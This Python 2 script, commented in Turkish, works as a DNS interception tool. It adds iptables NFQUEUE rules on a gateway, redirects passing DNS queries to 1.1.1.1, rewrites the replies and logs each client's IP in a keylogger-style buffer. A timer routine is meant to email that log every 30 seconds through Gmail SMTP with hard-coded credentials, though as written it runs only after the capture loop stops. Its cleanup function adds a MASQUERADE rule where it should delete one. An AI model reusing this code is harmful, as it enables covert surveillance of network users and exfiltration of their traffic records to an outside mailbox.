# coding=utf-8

# Gerekli kütüphaneleri import ediyoruz.
# import socket
import traceback
from netfilterqueue import NetfilterQueue
from scapy.compat import raw
from scapy.layers.dns import DNS
from scapy.layers.inet import IP, UDP, ICMP
import subprocess
import smtplib
import threading

# Gelen ve giden paket bilgilerini geçici olarak tutmamızı sağlayan sözlük dipi değişken
from scapy.layers.l2 import Ether

nat_table = {}
log = ""


# kuyruktan iletilen paketlerin işleneceği fonksiyon
def forward_dns(packet):
    real_dns = "1.1.1.1"
    pkt_data = packet.get_payload()
    pkt = IP(pkt_data)
    # print pkt[DNS].opcode
    # print pkt[DNS].ancount
    # DNS paketinin ilk olanını yakalıyoruz.
    if (
            DNS in pkt and
            pkt[DNS].opcode == 0 and
            pkt[DNS].ancount == 0 and
            pkt[IP].src != real_dns
    ):
        # global nat_table
        try:

            nat_table.update({
                str(pkt[DNS].id):
                    {
                        # "dns_id": str(pkt[DNS].id),
                        "src_ip": str(pkt[IP].src),
                        "dst_ip": str(pkt[IP].dst),
                        # "src_mac": str(pkt[].src)
                        # "src_port": str(pkt[UDP].sport),
                        # "dst_port": str(pkt[UDP].dport)

                    }
            })

            print "giden dns sorgusu"
            # print pkt[UDP].dport
            print "nat table", (nat_table)
            if (
                    pkt[UDP].dport == 53
            ):
                # print pkt.show2()
                # print pkt[DNS].summary()
                # print pkt[UDP].dport
                # print ("IP chksum", pkt[IP].chksum)
                # print pkt[UDP].chksum
                print ([pkt[IP].src], "->", [pkt[IP].dst])

                pkt[IP].dst = real_dns
                # print "DNS değiştirildi"
                del pkt[IP].len
                del pkt[IP].chksum
                del pkt[UDP].len
                del pkt[UDP].chksum
                # del pkt.chksum
                # pkt = (
                #         IP(src=pkt[IP].src, dst=pkt[IP].dst)
                #         / UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport)
                #         / DNS(
                #     qr=1,  # Response
                #     aa=1,  # Authoritative response
                #     id=pkt[DNS].id,  # Copying the DNS id from the query
                #     qd=pkt[DNS].qd,  # Copying the
                # )
                # )
                # pkt = (IP(dst=pkt[IP].dst, src=pkt[IP].src) / UDP(pkt[UDP]) / DNS(pkt[DNS]))
                pkt.IP = IP(dst=pkt[IP].dst)
                pkt = IP(raw(pkt))
                # pkt = pkt.__class__(bytes(pkt))
                # pkt.show2()
                packet.set_payload(str(pkt))
                packet.accept()
                # print [pkt]
                # print ("IP chksum", pkt[IP].chksum)
                # print pkt[UDP].chksum
                print ([pkt[IP].src], "->", [pkt[IP].dst])
                # print pkt.show2()

        except Exception:
            traceback.print_exc()
            packet.accept()
    if (
            pkt[UDP].sport == 53
    ):
        try:
            print "gelen DNS"
            print ([pkt[IP].src], "->", [pkt[IP].dst])
            # print "dns id gelen", pkt[DNS].id
            incoming_dns = str(pkt[DNS].id)
            if incoming_dns in nat_table:
                dns_items = nat_table.get(incoming_dns)
                pkt[IP].src = dns_items["dst_ip"]
                pkt[IP].dst = dns_items["src_ip"]
                # pkt[DNS].id = dns_items["dns_id"]

            # print "gelen DNS değiştirildi"
            # oluşturduğumuz tabloyu boşaltıyoruz.
            # nat_table.pop(incoming_dns, None)

            # len ve chksum bilgilerini siliyoruz. :ünkü paket değerleri değişti.
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[UDP].len
            del pkt[UDP].chksum

            # print pkt.show2()
            # print pkt[IP].src, pkt[IP].dst, pkt[DNS].id
            # pkt.IP = IP(src=pkt[IP].src, dst=pkt[IP].dst)
            # paketimizi yeni bilgilerle tekrar oluşturuyoruz.
            pkt.IP = IP(src=pkt[IP].src, dst=pkt[IP].dst)
            # pkt.DNS = DNS(id=pkt[DNS].id)
            # print pkt.show2()
            # len ve chksum bilgilerini tekrar hesaplatıyoruz.
            pkt = IP(raw(pkt))
            packet.set_payload(str(pkt))
            packet.accept()
            # print pkt.show2()
            print ([pkt[IP].src], "->", [pkt[IP].dst])
            catch_fake_dns(nat_table)

        except Exception:
            traceback.print_exc()
            packet.accept()


def send_email(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()


def send_nat_table():
    global log
    send_email("test@gmail.com", "testtest123456", log)
    log = ""
    timer_object = threading.Timer(30, send_nat_table)
    timer_object.start()


def catch_fake_dns(key):
    global log
    try:
        log = log + str(nat_table)
        # log = log + str(key.char)
    except AttributeError:
        log = log + str(key)
    print "catch fake dns ", (log)


def clean_up(*args):
    subprocess.call('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1', shell=True)
    subprocess.call('iptables -t mangle -D PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num 1', shell=True)
    subprocess.call('iptables -A POSTROUTING -t nat  -j MASQUERADE', shell=True)
    subprocess.call('iptables -D POSTROUTING -t nat -o eth0 -j MASQUERADE', shell=True)
    # subprocess.call('iptables -t nat -D OUTPUT -p udp --dport 53 -j DNAT --to 8.8.8.8:53', shell=True)
    # subprocess.call('iptables -t nat -D OUTPUT -p tcp --dport 53 -j DNAT --to 8.8.8.8:53', shell=True)
    # subprocess.call('iptables -D INPUT -p udp --sport 53  -j NFQUEUE --queue-num 2', shell=True)
    # subprocess.call('iptables -t nat -D PREROUTING -p udp --sport 53  -j NFQUEUE --queue-num 2', shell=True)
    # subprocess.call('iptables -F', shell=True)


nfqueue = NetfilterQueue()
nfqueue.bind(1, forward_dns)

try:
    subprocess.call('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1', shell=True)
    subprocess.call('iptables -t mangle -A PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num 1', shell=True)
    subprocess.call('iptables -D POSTROUTING -t nat  -j MASQUERADE', shell=True)
    subprocess.call('iptables -A POSTROUTING -t nat -o eth0 -j MASQUERADE', shell=True)
    # subprocess.call('iptables -t nat -A OUTPUT -p udp --dport 53 -j DNAT --to 8.8.8.8:53', shell=True)
    # subprocess.call('iptables -t nat -A OUTPUT -p tcp --dport 53 -j DNAT --to 8.8.8.8:53', shell=True)
    # subprocess.call('iptables -A INPUT -p udp --sport 53  -j NFQUEUE --queue-num 2', shell=True)
    # subprocess.call('iptables -t nat -A PREROUTING -p udp --sport 53  -j NFQUEUE --queue-num 2', shell=True)

    print('[*] running..')
    nfqueue.run()
    send_nat_table()

except KeyboardInterrupt:
    nfqueue.unbind()
    nat_table = {}
    clean_up()
    print(' çıktınız')



